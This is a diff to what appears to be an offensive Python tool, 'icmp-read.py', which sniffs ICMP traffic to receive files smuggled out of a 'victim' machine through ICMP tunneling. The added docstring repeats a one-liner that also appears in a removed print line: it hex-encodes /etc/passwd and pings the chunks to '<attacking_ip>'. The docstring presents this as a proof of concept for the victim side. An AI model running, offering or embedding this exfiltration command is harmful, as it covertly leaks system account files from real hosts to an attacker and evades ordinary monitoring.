@@ -1,9 +1,26 @@
-#Tested in Python3
+'''
+By: MVV-AROD
+Last Modification: Jan 2019
+
+Tested in Python3. Still in BETA.
+To do: Add exception/errors/logging
+
+The argument will include:
+
+-i interFace  (this argument is mandatory and requires the interface you want listen on)
+
+Usage:icmp-read.py -i eth0
+
+Your script will do the following:
+
+- Listen on ICMP traffic and print it nicely to the screen. This is used for ICMP tunneling to read files on the victim filesystem.
+- For proof of concept, run the following on your victim: xxd -p -c 4 /etc/passwd | while read line; do ping -c 1 -p $line <attacking_ip>; done 
+
+'''
+
 
 import argparse
 from scapy.all import *
-
-#To do: Add exception/errors/logging
 
 def process_packet(pkt):
 
@@ -25,8 +42,6 @@ if __name__ == '__main__':
     args = parser.parse_args()
     interFace = args.interFace
 
-    print ("[+] MVV-AROD. ENERO 2019\n")
-    print ("[+] Try something like: xxd -p -c 4 /etc/passwd | while read line; do ping -c 1 -p $line <attacking_ip>; done")
     print ("[+] Waiting on ICMP Traffic....\n")
 
     sniff(iface=interFace, prn=process_packet)
